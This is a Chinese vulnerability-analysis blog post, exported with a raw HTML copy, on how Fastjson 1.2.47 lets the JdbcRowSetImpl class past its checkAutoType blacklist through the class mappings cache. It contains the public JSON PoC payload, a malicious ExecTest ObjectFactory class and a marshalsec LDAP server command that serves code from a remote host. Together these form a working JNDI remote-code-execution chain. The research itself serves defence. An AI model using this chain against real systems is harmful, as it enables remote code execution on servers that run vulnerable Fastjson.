ser.java中的如下代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b533500e7b23d973fdbc5987b7dcbd46.png)\n\n从上图第一个红框可见，checkAutoType在将用户传入的@type值返回后，程序会赋值给上图316行处clazz变量，而上图384行处的deserialze方法紧接着处理这个clazz变量\n\n跟入位于com/alibaba/fastjson/serializer/MiscCodec.java的deserialze方法中\n\n```java\n    public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {\n        JSONLexer lexer = parser.lexer;\n\n        ⋮\n\n            if (lexer.token() == JSONToken.LITERAL_STRING) {\n                if (!\"val\".equals(lexer.stringVal())) {\n                    throw new JSONException(\"syntax error\");\n                }\n                lexer.nextToken();\n            } else {\n                throw new JSONException(\"syntax error\");\n            }\n\n            parser.accept(JSONToken.COLON);\n\n            objVal = parser.parse();\n\n            parser.accept(JSONToken.RBRACE);\n\n        ⋮\n\n        if (objVal == null) {\n            strVal = null;\n        } else if (objVal instanceof String) {\n            strVal = (String) objVal;\n        } \n        \n        ⋮\n\n        if (clazz == Class.class) {\n            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());\n        }\n```\n\n此时传入deserialze中clazz变量为checkAutoType安全模块校验后返回的\"java.lang.Class\"，而fieldName变量值为解析的第一个json字段名\"a\"\n\n接着来看deserialze方法，在deserialze中与本次漏洞与poc构造的代码块主要有三部分，分别是：\n\n1. 取出json字符串中val值\n\n```java\n            if (lexer.token() == JSONToken.LITERAL_STRING) {\n                if (!\"val\".equals(lexer.stringVal())) {\n                    throw new JSONException(\"syntax error\");\n                }\n                lexer.nextToken();\n            } else {\n                throw new JSONException(\"syntax error\");\n            }\n\n            parser.accept(JSONToken.COLON);\n\n            objVal = parser.parse();\n\n            parser.accept(JSONToken.RBRACE);\n```\n\n在这段代码中，程序将判断传入的json字符串中是否有”val”,并将其值通过下图第一个红框处的代码取出赋值给objVal变量。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/47177876b55bd9044eddca76e26b86de.png)\n\n2. 将objVal变量值转换为String类型并赋值strVal变量\n\n```java\n        if (objVal == null) {\n            strVal = null;\n        } else if (objVal instanceof String) {\n            strVal = (String) objVal;\n        } \n```\n\n这段代码与上一段衔接，objVal变量值又传递给下图第二个红框处。strVal变量判断objVal非空且为String类实例时，将其转换为String类型并赋值与strVal\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/886de67b224f656905c2ffb37cd22001.png)\n\n3. 调用TypeUtils.loadClass处理val值\n\n```java\n        if (clazz == Class.class) {\n            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());\n        }\n```\n\n这段代码的作用时，当传入的clazz变量为Class的类对象时，调用TypeUtils.loadClass处理strVal(即json字符串中的val值)\n\n在分析完deserialze方法的加工流程后，我们回头看看poc中构造的val值是什么，见下图红框处\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/088df0f5968737cfa586757403329393.png)\n\npoc中构造的是com.sun.rowset.JdbcRowSetImpl字符串，也就是过往漏洞利用中可利用的类。但是根据之前的分析，自从黑名单机制的完善，这个类早已已经不能简单的直接利用了，这个漏洞究竟是如何让这个类绕过黑名单重获新生呢？我们继续往下看看TypeUtils.loadClass中的操作，继续跟入位于com/alibaba/fastjson/util/TypeUtils.java的loadClass\n\n```java\n    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {\n        if(className == null || className.length() == 0){\n            return null;\n        }\n        Class<?> clazz = mappings.get(className);\n        if(clazz != null){\n            return clazz;\n        }\n        if(className.charAt(0) == '['){\n            Class<?> componentType = loadClass(className.substring(1), classLoader);\n            return Array.newInstance(componentType, 0).getClass();\n        }\n        if(className.startsWith(\"L\") && className.endsWith(\";\")){\n            String newClassName = className.substring(1, className.length() - 1);\n            return loadClass(newClassName, classLoader);\n        }\n        try{\n            if(classLoader != null){\n                clazz = classLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        } catch(Throwable e){\n            e.printStackTrace();\n            // skip\n        }\n        try{\n            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n            if(contextClassLoader != null && contextClassLoader != classLoader){\n                clazz = contextClassLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        } catch(Throwable e){\n            // skip\n        }\n```\n\nloadClass接收的一个参数:\"className\"为String类型变量，根据上文的调用关系，这里传入的是字符串\"com.sun.rowset.JdbcRowSetImpl\",即className参数值为\"com.sun.rowset.JdbcRowSetImpl\"\n\n通过分析loadClass方法代码，可以发现如下代码\n\n```java\n        try{\n            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n            if(contextClassLoader != null && contextClassLoader != classLoader){\n                clazz = contextClassLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        }\n```\n\n在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量(\"com.sun.rowset.JdbcRowSetImpl\")获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f4935a82428a0c6642e7509665520283.png)\n\n接着，程序判断cache变量情况：在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/841cfa794636ad9294c1c64afe0c1522.png)\n\n经过动态调试可以发现，通过上面的一系列操作，Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/627c0a9c95e6249cd96f15fcfb201c8c.png)\n\n在我们的第一个json字符串解析完成后，程序随后会解析我们第二个json字符串\n\n### \"b\":{\"\\@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\",\"autoCommit\":true}解析过程\n\n与第一个json字符串解析流程完全一致，程序也执行到下图部分\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/24ef953b36ad28dd753484d28f2a5ffb.png)\n\n由于这次Mapping中有键名为com.sun.rowset.JdbcRowSetImpl的元素，因此clazz被赋值为com.sun.rowset.JdbcRowSetImpl类对象\n\n从下面两张图可见，此时上文的流程完全一致，只不过这次返回的时com.sun.rowset.JdbcRowSetImpl类对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a680629fb9e9f50beaff134655281076.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5918f6f889685868b8888d34093a5b47.png)\n\ncom.sun.rowset.JdbcRowSetImpl恶意类被顺利返回，但是整个操作流程中并未触发checkAutoType黑白名单校验机制。随后com.sun.rowset.JdbcRowSetImpl恶意类被反序列化，触发漏洞利用\n\n## 漏洞利用\n\n为了证实漏洞的存在，我们首先在192.167.30.116服务器的80端口web服务上部署ExecTest.class。ExecTest.java中内容如下\n\n```java\nimport javax.naming.Context;\nimport javax.naming.Name;\nimport javax.naming.spi.ObjectFactory;\nimport java.io.IOException;\nimport java.util.Hashtable;\n\npublic class ExecTest implements ObjectFactory {\n\n    @Override\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        exec(\"xterm\");\n        return null;\n    }\n\n    public static String exec(String cmd) {\n        try {\n            Runtime.getRuntime().exec(\"calc.exe\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return \"\";\n    }\n\n    public static void main(String[] args) {\n        exec(\"123\");\n    }\n}\n```\n\n使用marshalsec开启ladp服务，监听在1389端口\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.167.30.116/java/#ExecTest\" 1389\n```\n\n![image-20200918145806799](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145806799.png)\n\ndemo程序执行完毕，计算器成功弹出\n\n![image-20200918145737798](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145737798.png)","slug":"fastjsonsecurity2","published":1,"updated":"2020-10-27T09:23:49.115Z","_id":"ckgrozu9d003iwsa9a76n4pxf","comments":1,"layout":"post","photos":[],"link":"","content":"<img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.jpg\" width=\"0\" height=\"0\" />\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文衔接上一篇文章《FastJson历史漏洞研究（一）》，继续探讨一下FastJson的历史漏洞。这次将要介绍的是Fastjson 1.2.47版本存漏洞成因以及其利用方式。</p>\n<h2 id=\"Fastjson-1-2-47漏洞分析\"><a href=\"#Fastjson-1-2-47漏洞分析\" class=\"headerlink\" title=\"Fastjson 1.2.47漏洞分析\"></a>Fastjson 1.2.47漏洞分析</h2><p>Fastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行</p>\n<p>首先来看一下公开的poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String payload = <span class=\"string\">&quot;&#123;\\&quot;a\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;b\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(payload);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>从代码中可见，与以往利用不同的是，该poc中构造了两个json字符串</p>\n<p>1、”a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”}</p>\n<p>2、”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}</p>\n<p>为了弄清楚这样构造的意义，我们来动态调试一下这个漏洞</p>\n<p>程序首先解析第一个json字符串</p>\n<h3 id=\"“a”-“-type”-”java-lang-Class”-”val”-”com-sun-rowset-JdbcRowSetImpl”-解析过程\"><a href=\"#“a”-“-type”-”java-lang-Class”-”val”-”com-sun-rowset-JdbcRowSetImpl”-解析过程\" class=\"headerlink\" title=\"“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”} 解析过程\"></a>“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”} 解析过程</h3><p>我们跳过部分FastJson解析流程，直接来看checkAutoType安全模块时的操作。对这个字符串中@type字段进行校验</p>\n<p>在位于com/alibaba/fastjson/parser/ParserConfig.java的checkAutoType安全模块中，程序首先进入了这个分支，程序调用getClassFromMapping对typeName进行解析，typeName即为字符串中@type的值，在第一个json字符串中，这个值为”java.lang.Class”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2420aa3e444cd8831083d8d5b478abfc.png\"></p>\n<p>我们跟入位于com/alibaba/fastjson/util/TypeUtils.java 的getClassFromMapping</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1645767771638713c708e6ea1cccd750.png\"></p>\n<p>从上图代码可见，程序想从mappings中寻找键名为”java.lang.Class”的元素并返回对应的键值。值得一提的是，mappings集合与后文将要讲到的buckets集合对这个漏洞至关重要，这二者是这个漏洞产生的核心因素</p>\n<ul>\n<li>mappings集合</li>\n</ul>\n<p>mappings中存储的数据都是什么呢?经过调试可以发现其中数据形式如下图中所展示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1946d987b45c01b2fb8ef2f301f33555.png\"></p>\n<p>从上图可见，mappings中存储着类名字符串以及对应类对象。然而mappings中的数据又是从何而来的呢？</p>\n<p>经过调试发现，mappings中存储的数据是由位于com/alibaba/fastjson/util/TypeUtils.java的addBaseClassMappings方法添加的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1c543ae7df2885e45fcfb221acbaec02.png\"></p>\n<p>从Mapping集合中的数据可以猜测，Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率</p>\n<p>在弄清楚mappings列表的由来后，继续回到正题。我们构造的typeName(@type指定的”java.lang.Class”)并不在Mappings的键中。因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。此时程序接着调用deserializers.findClass对传入的typeName进行解析</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8dd7c917dd26e4b7b91f88e99b3f27b6.png\"></p>\n<p>我们跟入位于com/alibaba/fastjson/util/IdentityHashMap.java的findClass方法进行进一步分析</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2f2986a32d56d2b54865f4ebcb9d23f6.png\"></p>\n<p>从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回</p>\n<ul>\n<li>buckets集合</li>\n</ul>\n<p>现在我们要谈谈buckets集合了。buckets又存储着什么元素呢？见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/22563478e0b87b0d289cf35117c3231c.png\"></p>\n<p>上图我们展开了一个buckets集合中元素进行展示。与Mapping集合相同的问题产生了：buckets中的元素都有哪些、他们又从何而来呢？经过调试我们在见下三张图中找到了答案</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8007c0112c7801da18f86ac3a75e8e6d.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/412c0f522602bd8daf58abf8f69db50b.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e6b05a79b6d0f0fdadd4cc6d77a4a18a.png\"></p>\n<p>通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap</p>\n<p>回到调试流程中findClass方法来，我们构造的typeName(@type指定的”java.lang.Class”)被findClass方法匹配到了，因此java.lang.Class类对象被返回</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/82dd20226b88a73b0da0445e9f14e06b.png\"></p>\n<p>在findClass执行完成后，java.lang.Class类对象被返回到checkAutoType中并赋值给clazz，checkAutoType方法也将于963行处将clazz返回</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/46f06595b7368dd74198ee7d766d7b88.png\"></p>\n<p>回顾一下上文中的Mapping集合和buckets集合，Fastjson为什么要将用户传入的@type字段指定的字符串在这两个集合中匹配呢?</p>\n<p>Mapping集合则是用来存储基础的Class，如果@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作。</p>\n<p>但无论Mapping集合与buckets集合实际作用是什么，但凡用户传入的@type字段字段值在两个集合中任意一个中，且程序使用JSON.parseObject(payload);这样的形式解析字符串(确保expectClass为空，防止进入上图957行if分支)，checkAutoType都将会直接将其对应的Class返回。</p>\n<p>checkAutoType在将clazz返回后，程序将会执行到com/alibaba/fastjson/parser/DefaultJSONParser.java中的如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b533500e7b23d973fdbc5987b7dcbd46.png\"></p>\n<p>从上图第一个红框可见，checkAutoType在将用户传入的@type值返回后，程序会赋值给上图316行处clazz变量，而上图384行处的deserialze方法紧接着处理这个clazz变量</p>\n<p>跟入位于com/alibaba/fastjson/serializer/MiscCodec.java的deserialze方法中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;T&gt; <span class=\"function\">T <span class=\"title\">deserialze</span><span class=\"params\">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class=\"line\">    JSONLexer lexer = parser.lexer;</span><br><span class=\"line\"></span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"string\">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            lexer.nextToken();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        parser.accept(JSONToken.COLON);</span><br><span class=\"line\"></span><br><span class=\"line\">        objVal = parser.parse();</span><br><span class=\"line\"></span><br><span class=\"line\">        parser.accept(JSONToken.RBRACE);</span><br><span class=\"line\"></span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (objVal == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        strVal = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (objVal <span class=\"keyword\">instanceof</span> String) &#123;</span><br><span class=\"line\">        strVal = (String) objVal;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    </span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz == Class.class) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时传入deserialze中clazz变量为checkAutoType安全模块校验后返回的”java.lang.Class”，而fieldName变量值为解析的第一个json字段名”a”</p>\n<p>接着来看deserialze方法，在deserialze中与本次漏洞与poc构造的代码块主要有三部分，分别是：</p>\n<ol>\n<li>取出json字符串中val值</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"string\">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    lexer.nextToken();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">parser.accept(JSONToken.COLON);</span><br><span class=\"line\"></span><br><span class=\"line\">objVal = parser.parse();</span><br><span class=\"line\"></span><br><span class=\"line\">parser.accept(JSONToken.RBRACE);</span><br></pre></td></tr></table></figure>\n\n<p>在这段代码中，程序将判断传入的json字符串中是否有”val”,并将其值通过下图第一个红框处的代码取出赋值给objVal变量。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/47177876b55bd9044eddca76e26b86de.png\"></p>\n<ol start=\"2\">\n<li>将objVal变量值转换为String类型并赋值strVal变量</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (objVal == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">    strVal = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (objVal <span class=\"keyword\">instanceof</span> String) &#123;</span><br><span class=\"line\">    strVal = (String) objVal;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这段代码与上一段衔接，objVal变量值又传递给下图第二个红框处。strVal变量判断objVal非空且为String类实例时，将其转换为String类型并赋值与strVal</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/886de67b224f656905c2ffb37cd22001.png\"></p>\n<ol start=\"3\">\n<li>调用TypeUtils.loadClass处理val值</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (clazz == Class.class) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码的作用时，当传入的clazz变量为Class的类对象时，调用TypeUtils.loadClass处理strVal(即json字符串中的val值)</p>\n<p>在分析完deserialze方法的加工流程后，我们回头看看poc中构造的val值是什么，见下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/088df0f5968737cfa586757403329393.png\"></p>\n<p>poc中构造的是com.sun.rowset.JdbcRowSetImpl字符串，也就是过往漏洞利用中可利用的类。但是根据之前的分析，自从黑名单机制的完善，这个类早已已经不能简单的直接利用了，这个漏洞究竟是如何让这个类绕过黑名单重获新生呢？我们继续往下看看TypeUtils.loadClass中的操作，继续跟入位于com/alibaba/fastjson/util/TypeUtils.java的loadClass</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class=\"keyword\">boolean</span> cache) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(clazz != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>)&#123;</span><br><span class=\"line\">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>))&#123;</span><br><span class=\"line\">        String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(classLoader != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            clazz = classLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(contextClassLoader != <span class=\"keyword\">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class=\"line\">            clazz = contextClassLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>loadClass接收的一个参数:”className”为String类型变量，根据上文的调用关系，这里传入的是字符串”com.sun.rowset.JdbcRowSetImpl”,即className参数值为”com.sun.rowset.JdbcRowSetImpl”</p>\n<p>通过分析loadClass方法代码，可以发现如下代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span 